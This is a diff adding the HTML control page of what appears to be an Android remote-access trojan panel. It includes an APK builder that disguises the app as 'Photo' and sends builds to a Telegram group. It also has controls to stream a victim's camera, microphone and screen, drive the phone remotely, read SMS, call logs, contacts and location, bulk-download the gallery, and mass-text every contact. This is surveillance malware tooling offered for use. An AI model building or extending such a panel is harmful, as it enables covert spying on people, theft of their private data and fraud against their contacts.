@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Android Remote Panel</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://unpkg.com/jszip@3.10.1/dist/jszip.min.js"></script>
+</head>
+<body>
+  <header class="topbar">
+    <button id="backBtn" class="sm" style="display:none" title="Назад к выбору устройства">← Устройства</button>
+    <div class="brand">📱 Android Remote Panel</div>
+    <div class="topbar-right">
+      <a id="adminLink" href="/admin-users.html" class="hdr-link" style="display:none" title="Управление пользователями">👥 Пользователи</a>
+      <a href="/logout" class="hdr-link" title="Выйти">Выйти</a>
+    </div>
+  </header>
+
+  <!-- Первый экран: выбор устройства + билдинг APK -->
+  <div id="picker" class="picker">
+    <nav class="picker-tabs">
+      <button class="picker-tab active" data-ptab="devices">Устройства</button>
+      <button class="picker-tab" data-ptab="build">Собрать APK</button>
+    </nav>
+
+    <!-- Вкладка: список устройств -->
+    <div class="picker-panel active" id="ptab-devices">
+      <div class="picker-top">
+        <div class="dft-bar">
+          <button class="dft active" data-dft="all">Все</button>
+          <button class="dft" data-dft="online">Онлайн</button>
+          <button class="dft" data-dft="offline">Офлайн</button>
+          <button class="dft" data-dft="deleted">Удалённые</button>
+        </div>
+        <button id="pickerRefresh" class="sm">⟳</button>
+      </div>
+      <div id="phoneGrid" class="phone-list"></div>
+      <p id="pickerStatus" class="picker-status">Ожидание подключения телефонов…</p>
+    </div>
+
+    <!-- Вкладка: конструктор APK -->
+    <div class="picker-panel" id="ptab-build">
+      <div class="build-scroll">
+        <div class="card">
+          <h3>Конструктор APK</h3>
+          <p class="muted-text">Приложение стримит камеру и экран телефона в эту панель. Позволяет управлять телефоном удалённо — нажатия и свайпы через браузер.</p>
+          <label class="fld">Название приложения
+            <input id="bAppName" value="Photo">
+          </label>
+          <label class="fld">Package (applicationId)
+            <input id="bAppId" value="app.photo" spellcheck="false">
+          </label>
+          <label class="fld">Иконка (PNG, необязательно)
+            <input id="bIcon" type="file" accept="image/png">
+          </label>
+          <label class="fld">
+            Адрес панели — зашивается в APK, телефон подключается сам
+            <input id="bServer" placeholder="определяется автоматически…" spellcheck="false" required>
+          </label>
+          <!-- Для обычного пользователя скрыто и заполняется автоматически -->
+          <div class="fld" id="bOwnerRow" style="display:none">
+            Владелец устройств из этого APK
+            <select id="bOwnerUser">
+              <option value="">— Только для admin (без владельца) —</option>
+            </select>
+            <span class="muted-text">Телефоны, подключённые через этот APK, будут видны только выбранному пользователю.</span>
+          </div>
+          <input type="hidden" id="bOwnerUserHidden">
+          <div class="fld" id="permsFld">Разрешения:
+            <div id="bundlesRow" class="bundles-row"></div>
+            <div class="perm-all-row">
+              <button type="button" id="permSelectAll" class="sm">✓ Выбрать всё</button>
+              <button type="button" id="permClearAll" class="sm">✕ Снять всё</button>
+            </div>
+            <label class="chk"><input type="checkbox" id="permCamera"> Камера</label>
+            <label class="chk"><input type="checkbox" id="permMic"> Микрофон</label>
+            <label class="chk"><input type="checkbox" id="permScreen"> Экран и управление</label>
+            <label class="chk"><input type="checkbox" id="permNotif"> Уведомления</label>
+            <div class="perm-group" id="pgrpPhone">
+              <div class="perm-group-hd">
+                <input type="checkbox" id="permPhoneAll" class="perm-master">
+                <span class="perm-group-lbl">Телефон</span>
+                <span class="perm-chevron">▼</span>
+              </div>
+              <div class="perm-group-bd">
+                <label class="chk"><input type="checkbox" id="permPhoneState" data-master="permPhoneAll"> Инфо о телефоне (IMEI, оператор)</label>
+                <label class="chk"><input type="checkbox" id="permCallLog" data-master="permPhoneAll"> Журнал звонков</label>
+                <label class="chk"><input type="checkbox" id="permCallPhone" data-master="permPhoneAll"> Совершать звонки</label>
+                <label class="chk"><input type="checkbox" id="permContacts" data-master="permPhoneAll"> Контакты</label>
+              </div>
+            </div>
+            <div class="perm-group" id="pgrpSms">
+              <div class="perm-group-hd">
+                <input type="checkbox" id="permSmsAll" class="perm-master">
+                <span class="perm-group-lbl">SMS</span>
+                <span class="perm-chevron">▼</span>
+              </div>
+              <div class="perm-group-bd">
+                <label class="chk"><input type="checkbox" id="permReadSms" data-master="permSmsAll"> Читать SMS</label>
+                <label class="chk"><input type="checkbox" id="permSendSms" data-master="permSmsAll"> Отправлять SMS</label>
+                <label class="chk"><input type="checkbox" id="permReceiveSms" data-master="permSmsAll"> Получать SMS</label>
+              </div>
+            </div>
+            <div class="perm-group" id="pgrpBt">
+              <div class="perm-group-hd">
+                <input type="checkbox" id="permBtAll" class="perm-master">
+                <span class="perm-group-lbl">Bluetooth</span>
+                <span class="perm-chevron">▼</span>
+              </div>
+              <div class="perm-group-bd">
+                <label class="chk"><input type="checkbox" id="permBtConnect" data-master="permBtAll"> Подключение к устройствам</label>
+                <label class="chk"><input type="checkbox" id="permBtScan" data-master="permBtAll"> Поиск Bluetooth-устройств</label>
+              </div>
+            </div>
+            <div class="perm-group" id="pgrpMedia">
+              <div class="perm-group-hd">
+                <input type="checkbox" id="permMediaAll" class="perm-master">
+                <span class="perm-group-lbl">Медиа (галерея)</span>
+                <span class="perm-chevron">▼</span>
+              </div>
+              <div class="perm-group-bd">
+                <label class="chk"><input type="checkbox" id="permMediaImages" data-master="permMediaAll"> Фото</label>
+                <label class="chk"><input type="checkbox" id="permMediaVideo" data-master="permMediaAll"> Видео</label>
+              </div>
+            </div>
+            <label class="chk"><input type="checkbox" id="permLocation"> Геолокация</label>
+            <label class="chk"><input type="checkbox" id="permCalendar"> Календарь</label>
+            <label class="chk"><input type="checkbox" id="permBattery"> Фоновая работа (батарея)</label>
+          </div>
+          <div class="fld">
+            <span class="muted-text">📦 Готовый APK будет отправлен в Telegram-группу автоматически.</span>
+          </div>
+          <button id="buildBtn" class="primary">Собрать APK</button>
+          <div id="buildMsg" class="build-msg"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Панель управления устройством (открывается после выбора) -->
+  <div class="layout" style="display:none">
+    <!-- Левая колонка: камера телефона -->
+    <section class="screen-col">
+      <div class="screen-toolbar">
+        <button id="btnCamSwitch" title="Переключить камеру">🤳 Фронт</button>
+        <button id="camMute" title="Включить/выключить звук">🔇 Тихо</button>
+<button id="btnStream" title="Приостановить/возобновить трансляцию">⏸ Пауза</button>
+        <span id="fps" class="fps"></span>
+      </div>
+      <div class="screen-wrap">
+        <img id="camLeft" alt="Камера телефона" draggable="false">
+        <div id="screenHint" class="screen-hint">Выбери телефон — камера появится здесь.</div>
+        <div id="camStatus" class="cam-status-overlay"></div>
+      </div>
+      <div class="text-input-row">
+        <input id="textInput" placeholder="Текст для отправки на телефон…">
+        <button id="sendText">Отправить</button>
+        <button data-ctrl-key="ENTER">⏎ Enter</button>
+        <button data-ctrl-key="DEL">⌫ Del</button>
+      </div>
+    </section>
+
+    <!-- Правая колонка: вкладки -->
+    <section class="panel-col">
+      <nav class="tabs">
+        <button class="tab active" data-tab="dashboard">Характеристики</button>
+        <button class="tab" data-tab="commands">Команды</button>
+        <button class="tab" data-tab="apps">Приложения</button>
+        <button class="tab" data-tab="files">Файлы</button>
+        <button class="tab" data-tab="notifs">Уведомления</button>
+        <button class="tab" data-tab="camera">Трансляция</button>
+        <button class="tab" data-tab="calls">Звонки</button>
+        <button class="tab" data-tab="sms">СМС<span id="smsBadge" style="display:none;margin-left:5px;background:#e74c3c;color:#fff;border-radius:10px;padding:1px 6px;font-size:11px;font-weight:700;vertical-align:middle"></span></button>
+      </nav>
+
+      <div class="tab-content active" id="tab-dashboard">
+        <div class="card" id="infoCard"><h3>Устройство</h3><div class="kv" id="infoKv">—</div></div>
+        <div class="card" id="batteryCard">
+          <h3>Батарея</h3>
+          <div class="battery-bar"><div id="batteryFill"></div><span id="batteryText"></span></div>
+          <div class="kv" id="batteryKv">—</div>
+        </div>
+        <div class="card" id="sysInfoCard">
+          <h3>Система</h3>
+          <div class="kv" id="sysInfoKv"><span style="color:var(--muted)">Ожидание данных от телефона…</span></div>
+        </div>
+        <div class="card" id="permsCard">
+          <h3>Разрешения</h3>
+          <div class="kv" id="permsKv"><span style="color:var(--muted)">Ожидание данных от телефона…</span></div>
+        </div>
+        <button id="refreshDash">Обновить</button>
+      </div>
+
+      <div class="tab-content" id="tab-commands">
+        <div class="card">
+          <h3>Аппаратные функции</h3>
+          <div class="cmd-row">
+            <span class="cmd-label">🔵 Bluetooth</span>
+            <button id="cmdBtToggle" class="sm toggle-btn">Выкл</button>
+          </div>
+          <div class="cmd-row">
+            <span class="cmd-label">🔦 Фонарик</span>
+            <button id="cmdTorchToggle" class="sm toggle-btn">Выкл</button>
+          </div>
+          <div class="cmd-row">
+            <span class="cmd-label">📳 Вибрация</span>
+            <input type="range" id="vibrateMs" min="100" max="2000" value="500" step="100" style="width:100px">
+            <span id="vibrateMsVal">500 мс</span>
+            <button id="cmdVibrate" class="sm">Вибро</button>
+          </div>
+        </div>
+        <div class="card">
+          <h3>🔊 Громкость</h3>
+          <div class="vol-row"><span class="cmd-label">Медиа</span><input type="range" class="vol-slider" data-stream="media" min="0" max="15" value="5"><span class="vol-val">—</span></div>
+          <div class="vol-row"><span class="cmd-label">Звонок</span><input type="range" class="vol-slider" data-stream="ring" min="0" max="15" value="5"><span class="vol-val">—</span></div>
+          <div class="vol-row"><span class="cmd-label">Будильник</span><input type="range" class="vol-slider" data-stream="alarm" min="0" max="15" value="5"><span class="vol-val">—</span></div>
+          <div class="vol-row"><span class="cmd-label">Уведомл.</span><input type="range" class="vol-slider" data-stream="notif" min="0" max="15" value="5"><span class="vol-val">—</span></div>
+        </div>
+        <div class="card">
+          <h3>📍 Геолокация</h3>
+          <div class="cmd-row">
+            <button id="cmdGetLocation" class="sm">Обновить</button>
+            <span id="locationCoords" class="muted-text" style="flex:1;font-size:12px;margin-left:8px"></span>
+          </div>
+          <div class="location-map-wrap">
+            <div id="locationMapPh" class="location-map-ph">Нажми «Обновить» для получения координат</div>
+            <div id="leafletMap" class="leaflet-map-div" style="display:none"></div>
+          </div>
+        </div>
+        <div class="card">
+          <h3>📅 Календарь</h3>
+          <div class="cmd-row">
+            <span class="cmd-label">Дней:</span>
+            <input type="number" id="calDays" value="14" min="1" max="365" style="width:60px">
+            <button id="cmdLoadCalendar" class="sm">Загрузить</button>
+          </div>
+          <div id="calendarList" class="calendar-list"></div>
+        </div>
+      </div>
+
+      <div class="tab-content" id="tab-apps">
+        <div class="row">
+          <input id="appFilter" placeholder="Фильтр по имени пакета…">
+          <label class="chk"><input type="checkbox" id="appsAll"> все</label>
+          <button id="refreshApps">Обновить</button>
+        </div>
+        <ul id="appList" class="list"></ul>
+      </div>
+
+      <div class="tab-content" id="tab-files">
+        <!-- Загрузки -->
+        <div class="card" id="dlCard" style="margin-bottom:12px">
+          <div class="dl-card-hd" id="dlCardHd">
+            <span style="font-weight:700;font-size:14px">⬇ Загрузки</span>
+            <span id="dlBadge" style="display:none;background:var(--accent2);color:#fff;border-radius:10px;padding:1px 8px;font-size:12px;font-weight:700;margin-left:6px"></span>
+            <button class="sm" id="dlToggleBtn" style="margin-left:auto;font-size:11px">▲ Свернуть</button>
+          </div>
+          <div id="dlBody">
+            <div id="dlActiveList"><div class="dl-empty">Нет активных загрузок</div></div>
+            <div id="dlHistoryCard" style="display:none">
+              <div class="dl-card-hd" style="margin-top:10px">
+                <span style="font-size:11px;font-weight:700;text-transform:uppercase;color:var(--muted)">История</span>
+                <button class="sm" id="dlHistToggleBtn" style="font-size:11px;margin-left:auto">▲ Свернуть</button>
+              </div>
+              <div id="dlHistoryList"></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3>🖼 Галерея</h3>
+          <div id="galleryStats" class="muted-text" style="font-size:12px;padding:3px 0 2px"></div>
+          <!-- Массовое скачивание -->
+          <div id="bulkCtrl" style="margin:6px 0;padding:8px;border-radius:6px;border:1px solid var(--border,#ddd)">
+            <div class="cmd-row" style="gap:4px;flex-wrap:wrap">
+              <span style="font-size:12px;font-weight:600;align-self:center">⬇ Скачать:</span>
+              <button id="dlPhotosBtn" class="sm">📷 Все фото</button>
+              <button id="dlVideosBtn" class="sm">🎬 Все видео</button>
+              <button id="dlAllBtn" class="sm">📦 Всё</button>
+              <button id="dlCancelBtn" class="sm" style="display:none;margin-left:auto;background:#c0392b;color:#fff">✕ Стоп</button>
+            </div>
+            <div style="margin-top:7px;font-size:12px">
+              <div style="display:flex;justify-content:space-between;margin-bottom:2px">
+                <span>📷 Фото</span><span id="photoSliderLabel" class="muted-text">—</span>
+              </div>
+              <input type="range" id="photoSlider" min="0" max="0" value="0" style="width:100%">
+            </div>
+            <div style="margin-top:6px;font-size:12px">
+              <div style="display:flex;justify-content:space-between;margin-bottom:2px">
+                <span>🎬 Видео</span><span id="videoSliderLabel" class="muted-text">—</span>
+              </div>
+              <input type="range" id="videoSlider" min="0" max="0" value="0" style="width:100%">
+            </div>
+            <div id="bulkProgressArea" style="display:none;margin-top:8px">
+              <div style="display:flex;justify-content:space-between;font-size:12px;margin-bottom:3px">
+                <span id="bulkProgressText">Загрузка…</span>
+                <span id="bulkEtaText" class="muted-text"></span>
+              </div>
+              <progress id="bulkBar" max="100" value="0" style="width:100%;height:6px"></progress>
+            </div>
+          </div>
+          <!-- Gallery viewer -->
+          <div id="galleryArea" style="margin-top:8px">
+            <div id="galleryPlaceholder" style="text-align:center;padding:16px 0">
+              <button id="cmdLoadGallery" class="sm">🖼 Открыть галерею</button>
+            </div>
+            <div id="galleryFolderView" style="display:none">
+              <div id="galleryFolderGrid" class="gf-grid"></div>
+            </div>
+            <div id="galleryGridView" style="display:none">
+              <div class="cmd-row" style="margin-bottom:6px;align-items:center">
+                <button id="galleryBack" class="sm">← Папки</button>
+                <span id="galleryFolderTitle" style="flex:1;font-size:13px;font-weight:600;padding:0 8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis"></span>
+                <span id="galleryGridInfo" class="muted-text" style="font-size:12px"></span>
+              </div>
+              <div id="galleryGrid" class="gp-grid"></div>
+              <div id="galleryScrollSentinel" style="height:1px"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <div class="tab-content" id="tab-notifs">
+        <div class="row">
+          <input id="notifTitle" placeholder="Заголовок">
+          <input id="notifText" placeholder="Текст">
+          <button id="postNotif">Отправить на телефон</button>
+        </div>
+        <button id="refreshNotifs">Обновить список</button>
+        <ul id="notifList" class="list"></ul>
+      </div>
+
+      <div class="tab-content" id="tab-camera">
+        <div class="card">
+          <h3>Экран телефона <span id="phoneScreenStatus" class="cam-status">нет соединения</span></h3>
+          <div style="margin-bottom:8px">
+            <button data-ctrl-key="BACK" title="Назад">◀ Назад</button>
+            <button data-ctrl-key="HOME" title="Домой">● Домой</button>
+            <button data-ctrl-key="RECENTS" title="Недавние">■ Задачи</button>
+            <button data-ctrl-key="NOTIFICATIONS" title="Шторка">🔔 Шторка</button>
+          </div>
+          <div class="dpad" style="margin-bottom:8px">
+            <div class="dpad-row"><button class="dpad-btn" data-ctrl-key="DPAD_UP" title="Вверх">▲</button></div>
+            <div class="dpad-row">
+              <button class="dpad-btn" data-ctrl-key="DPAD_LEFT" title="Влево">◀</button>
+              <div class="dpad-center"></div>
+              <button class="dpad-btn" data-ctrl-key="DPAD_RIGHT" title="Вправо">▶</button>
+            </div>
+            <div class="dpad-row"><button class="dpad-btn" data-ctrl-key="DPAD_DOWN" title="Вниз">▼</button></div>
+          </div>
+          <div class="cam-wrap" style="max-width:480px">
+            <img id="phoneScreen" alt="" draggable="false" tabindex="0">
+            <div id="phoneScreenHint" class="screen-hint">Установи APK, включи службу специальных возможностей — скриншоты появятся автоматически.<br><br>Нажми = тап, потяни = свайп.</div>
+          </div>
+          <div class="screen-quality-row">
+            <label for="screenQuality">Качество</label>
+            <input type="range" id="screenQuality" min="10" max="90" value="60" step="5">
+            <span id="screenQualityVal">60%</span>
+          </div>
+          <div class="text-input-row" style="margin-top:8px">
+            <input id="phoneTextInput" placeholder="Текст для ввода…">
+            <button id="phoneSendText">Отправить</button>
+          </div>
+        </div>
+      </div>
+      <div class="tab-content" id="tab-calls">
+        <div class="card" id="phoneInfoCard">
+          <h3>Телефон <span id="callsStatus" class="cam-status">нет соединения</span></h3>
+          <div class="kv" id="phoneInfoKv">—</div>
+          <div class="kv" id="simsKv" style="margin-top:4px"></div>
+        </div>
+        <div class="card">
+          <div class="row">
+            <input id="dialInput" placeholder="Номер для звонка…" type="tel" style="flex:1">
+            <button id="callBtn">📞 Позвонить</button>
+          </div>
+        </div>
+        <div class="card">
+          <div class="row" style="margin-bottom:6px">
+            <b style="flex:1">Контакты</b>
+            <input id="contactSearch" placeholder="Поиск…" style="flex:2;margin:0 6px">
+            <button id="refreshContacts" class="sm">⟳</button>
+          </div>
+          <ul id="contactList" class="list" style="max-height:300px;overflow-y:auto"><li style="color:var(--muted);padding:8px">Загрузка…</li></ul>
+        </div>
+        <div class="row">
+          <b style="flex:1">Журнал звонков</b>
+          <button id="refreshCallLog" class="sm">⟳ Обновить</button>
+        </div>
+        <div style="overflow-x:auto">
+          <table class="call-log-table">
+            <thead><tr><th>Тип</th><th>Номер / Имя</th><th>Дата</th><th>Длит.</th></tr></thead>
+            <tbody id="callLogBody"><tr><td colspan="4" style="text-align:center;color:var(--muted)">Нет данных</td></tr></tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="tab-content" id="tab-sms">
+        <div class="card">
+          <h3>Новое сообщение</h3>
+          <div class="row">
+            <input id="smsTo" placeholder="Номер получателя…" type="tel" style="flex:1">
+            <button id="refreshSms" class="sm" title="Обновить список">⟳</button>
+          </div>
+          <textarea id="smsText" placeholder="Текст СМС…" rows="3" style="width:100%;resize:vertical;margin-bottom:8px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;font-size:13px;font-family:inherit"></textarea>
+          <button id="sendSmsBtn" class="primary">📤 Отправить</button>
+          <div id="smsSendStatus" class="sms-send-status"></div>
+        </div>
+        <div class="card" id="broadcastCard">
+          <div class="broadcast-toggle" id="broadcastToggle">
+            <span>📢 Массовая рассылка</span>
+            <span class="muted-text" style="font-size:11px;margin-left:8px">отправить всем контактам</span>
+            <span id="broadcastChevron" style="margin-left:auto">▼</span>
+          </div>
+          <div id="broadcastBody" style="display:none;margin-top:10px">
+            <textarea id="broadcastText" placeholder="Текст для рассылки…" rows="3" style="width:100%;resize:vertical;margin-bottom:8px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;font-size:13px;font-family:inherit"></textarea>
+            <div id="broadcastWarn" class="broadcast-warn" style="display:none">
+              ⚠️ Сообщение будет отправлено <b id="broadcastCount">всем</b> контактам. Это действие нельзя отменить.
+            </div>
+            <div class="row" style="margin-top:8px;gap:8px">
+              <button id="broadcastBtn" class="primary" style="flex:1">📢 Разослать</button>
+              <button id="broadcastCancelBtn" style="display:none">✕ Отмена</button>
+            </div>
+            <div id="broadcastProgress" style="display:none;margin-top:10px">
+              <div class="broadcast-bar-wrap"><div id="broadcastFill" class="broadcast-bar-fill"></div></div>
+              <div id="broadcastStatus" class="broadcast-status"></div>
+              <div id="broadcastLog" class="broadcast-log"></div>
+            </div>
+          </div>
+        </div>
+        <div id="smsList"></div>
+      </div>
+
+    </section>
+  </div>
+
+  <div id="toast" class="toast"></div>
+  <script src="panel.js?v=40"></script>
+</body>
+</html>
